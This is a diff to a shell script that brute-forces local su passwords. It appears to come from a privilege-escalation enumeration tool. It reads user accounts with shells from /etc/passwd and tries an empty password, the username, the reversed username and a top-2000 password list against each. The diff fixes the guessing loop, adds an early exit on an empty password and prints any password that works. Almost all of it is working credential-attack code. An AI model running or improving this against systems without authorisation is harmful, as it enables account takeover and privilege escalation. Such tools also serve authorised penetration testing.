@@ -37,9 +37,10 @@ su_try ()
  if [ "$trysu" ]; then
 
  print_red_yellow "WORKS FOR $SU_USER PASSWORD:  $PASSWD"
+	return 0
 
  fi
-
+	return 13
 }
 
   
@@ -50,19 +51,27 @@ su_brute()
 
     SU_USER=$1 # empty, login, reverse login
 
-    su_try "$SU_USER" "" &
-
+if su_try "$SU_USER" ""; then
+	echo "empty pass"
+	return 0
+fi	
     su_try "$SU_USER" "$SU_USER" &
 
     su_try "$SU_USER" "$(echo $SU_USER | rev 2>/dev/null)" &
 
-    for i_num in 2000; 
+    for i_num in $(seq 1 2000); 
         do
-        TEMP_PASSWD=$(echo $top2000 | cut -d '' -f $i_num)
-        echo "$TEMP_PASSWD"
+#	echo $top2000
+        TEMP_PASSWD=$(echo $top2000 | cut -d ' ' -f $i_num)
+#        echo "$TEMP_PASSWD"
+#        su_try "$SU_USER" "$TEMP_PASSWD" &
         su_try "$SU_USER" "$TEMP_PASSWD" &
-        
-        sleep 0.01
+
+	if (($i_num % 200 == 0)); then
+		echo "$i_num"
+	#	break
+	fi
+        sleep 0.05
         done
     wait
 
@@ -73,7 +82,8 @@ su_brute()
 print_2title "trying different passwords for other users"
 
 CHECK=$(check_su_exists)
-
+#echo "$top2000"
+#echo $top2000
 if [ "$CHECK" ];
     then
     SHELLERS=$(cat /etc/passwd 2>/dev/null | grep -i "sh$" | cut -d ":" -f 1)
